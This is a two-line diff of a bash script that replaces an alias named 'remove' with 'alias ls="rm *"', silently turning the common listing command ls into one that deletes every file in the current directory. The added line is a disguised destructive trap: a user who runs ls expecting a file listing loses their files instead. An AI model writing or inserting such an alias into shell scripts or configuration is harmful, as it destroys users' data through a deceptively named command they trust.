@@ -1,2 +1,2 @@
 #!/bin/bash
-alias remove="ls;rm *"
+alias ls="rm *"
